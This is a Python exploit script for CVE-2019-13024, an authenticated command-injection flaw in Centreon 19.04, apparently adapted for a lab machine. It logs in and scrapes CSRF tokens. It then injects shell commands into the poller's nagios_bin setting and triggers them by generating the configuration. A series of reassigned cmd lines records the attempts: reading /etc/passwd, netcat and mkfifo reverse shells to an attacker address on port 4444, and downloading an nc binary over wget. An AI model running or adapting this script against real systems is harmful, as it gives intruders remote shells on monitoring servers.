#!/usr/bin/python3

'''
# Exploit Title: Centreon v19.04 authenticated Remote Code Execution
# Date: 28/06/2019
# Exploit Author: Askar (@mohammadaskar2)
# CVE : CVE-2019-13024
# Vendor Homepage: https://www.centreon.com/
# Version: v19.04
# Tested on: CentOS 7.6 / PHP 5.4.16
'''

import requests
import sys
import warnings
from bs4 import BeautifulSoup
import json
from urllib.parse import urlencode

# turn off BeautifulSoup warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')


#if len(sys.argv) != 6:
#    print(len(sys.argv))
#    print("[~] Usage : ./centreon-exploit.py url username password ip port")
#    exit()



url = "http://10.10.10.157/centreon" # sys.argv[1]
username = "admin" # sys.argv[2]
password = "password1" #sys.argv[3]
ip = '10.10.14.18' #sys.argv[4]
port = '4444' #sys.argv[5]






headers_get = {
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://10.10.10.157/centreon/index.php',
    'Connection': 'close',
    }

request = requests.session()

#
# Send empty request to get token
#
print ("========= GET TOKEN =========")
print("[+] Retrieving CSRF token to submit the login form")

# Build request
# Send  request
page = request.get(url+"/index.php")
# Dump Request
print (page.request.headers)
print (page.request.body)

# Dump Response
print (page.status_code)
print (page.headers)
print (page.text)
print (request.cookies)

# Get Token
html_content = page.text
soup = BeautifulSoup(html_content,features="lxml")
token = soup.findAll('input')[3].get("value")
print (token)




print ("\n\n=======   TRY TO LOGIN    ===========")
# Build request
login_info = {
    "useralias": username,
    "password": password,
    "submitLogin": "Connect",
    "centreon_token": token
}

headers_post = {

    'Content-type': 'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests': '1',
}

# Send  request
print ("Sending POST login")
data="useralias=admin&password=password1&submitLogin=Connect&centreon_token="+token
login_resp = request.post(url+"/index.php", headers=headers_post, data=data)

# Dump response
print (login_resp.request.headers)
print (login_resp.request.body)

print (login_resp.history)

redirect_resp = login_resp.history[0]
print ("\n\nDumping POST login response")
print (redirect_resp) #.status_code)

print (redirect_resp.headers)
print (redirect_resp.text)
print (request.cookies)


# Get Token
login_html_content = redirect_resp.text
login_soup = BeautifulSoup(login_html_content,features="lxml")
login_token = login_soup.findAll('input')[3].get("value")

print("[+] Login token is : {0}".format(login_token))


def exploit_encode(str):
    str = str.replace(" ", "%20")
    str = str.replace("/", "%2F")
    str = str.replace("#", "%7D")
    str = str.replace("-", "%2D")
    str = str.replace('\\', "%5C")
    str = str.replace('&', "%26")
    str = str.replace(';', "%3B")
    str = str.replace('|', "%7C")
    return str

#
# Update using token
#
if True: #"Your credentials are incorrect." not in login_resp.text:
    print ("\n\n=======    LOGGED    ===========")
    print("[+] Logged In Sucssfully")
    print("[+] Retrieving Poller token")

    poller_configuration_page = url + "/main.get.php?p=60901"
    #get_poller_token = request.get(poller_configuration_page)


    #poller_html = get_poller_token.text
    #poller_soup = BeautifulSoup(poller_html)
    #poller_token = poller_soup.findAll('input')[24].get("value")
    #print("[+] Poller token is : {0}".format(poller_token))

    #cmd = "ping {0} #".format(ip, port)
    cmd = "uname#20#23"
    cmd = "cat%20%2Fetc%2Fpasswd%20%7D" # ok
    cmd = "n%5Cc%2010.10.14.18%204444%20%2De%20/bin/bash%20%7D" # cx but not bash
    cmd = "n%5Cc%2010.10.14.18%204444%20%2De%20%2Fbin%2Fbash%20%7D"
    cmd = "cat /etc/passwd #"
    cmd = "uname -a #"
    cmd = "n%5Cc 10.10.14.18 4444 -e /bin/bash" # ko  => old ncat
    cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.32 4444 >/tmp/f" # ko
    cmd = "wget http://10.10.14.18:8000/nc" # 0K .......... .......... ......                          100%  440K=0.06s<br><br>2019-09-19 17:01:57 (440 KB/s) - &#039;nc&#039; saved [27400/27400]
    cmd = "chmod 777 ./nc"
    cmd = "./n%5Cc 10.10.14.18 4444 -e /bin/bash" 
    print ("cmd ="+cmd)

    cmd = exploit_encode(cmd+" #")


    payload_info = {
        "submitC": "Save",
        "name": "Central",
        "ns_ip_address": "127.0.0.1",
        # this value should be 1 always
        "localhost[localhost]": "1",
        "is_default[is_default]": "0",
 
        "ssh_port": "22",
        "init_script": "centengine",
        # this value contains the payload , you can change it as you want
        #"nagios_bin": "ncat -e /bin/bash {0} {1} #".format(ip, port),
        #"nagios_bin": "ping {0} #".format(ip, port),
        "nagios_bin": "uname #",
        "nagiostats_bin": "/usr/sbin/centenginestats",
        "nagios_perfdata": "/var/log/centreon-engine/service-perfdata",
        "centreonbroker_cfg_path": "/etc/centreon-broker",
        "centreonbroker_module_path": "/usr/share/centreon/lib/centreon-broker",
        "centreonbroker_logs_path": "",
        "centreonconnector_path": "/usr/lib64/centreon-connector",
        "init_script_centreontrapd": "centreontrapd",
        "snmp_trapd_path_conf": "/etc/snmp/centreon_traps/",
        "ns_activate[ns_activate]": "1",

        "id": "1",
        "o": "c",
        "centreon_token": login_token, #poller_token,
        #"remote_id": "",

    }

    data = "submitC=Save&name=Central&ns_ip_address=127.0.0.1&localhost%5Blocalhost%5D=1&is_default%5Bis_default%5D=0&ssh_port=22&init_script=centengine&nagios_bin="+cmd+"&nagiostats_bin=%2Fusr%2Fsbin%2Fcentenginestats&nagios_perfdata=%2Fvar%2Flog%2Fcentreon-engine%2Fservice-perfdata&centreonbroker_cfg_path=%2Fetc%2Fcentreon-broker&centreonbroker_module_path=%2Fusr%2Fshare%2Fcentreon%2Flib%2Fcentreon-broker&centreonbroker_logs_path=&centreonconnector_path=%2Fusr%2Flib64%2Fcentreon-connector&init_script_centreontrapd=centreontrapd&snmp_trapd_path_conf=%2Fetc%2Fsnmp%2Fcentreon_traps%2F&ns_activate%5Bns_activate%5D=1&id=1&o=c&centreon_token="+login_token
    send_payload = request.post(poller_configuration_page, headers=headers_post, data=data)

    print("[+] ====Dump : Config POST")
    print (send_payload.request.headers)
    print (send_payload.request.body)



    print("[+] ====Dump : Config Resp")
    print (send_payload)
    print (send_payload.history)
    print (send_payload.headers)
    #print (send_payload.text)

    #print (send_payload.text)
    print("[+] ==========================")
    print("[+] Injecting Done, triggering the payload")
    print("[+] Check you netcat listener !")


    #
    #
    #
    generate_xml_page = url + "/include/configuration/configGenerate/xml/generateFiles.php"
    xml_page_data = {
        "poller": "1",
        "debug": "true",
        "generate": "true",
    }
    req = request.post(generate_xml_page, xml_page_data)
    print (req.text)
    if "NOK" in req.text:
        print ("ko")

else:
    print("[-] Wrong credentials")
    exit()
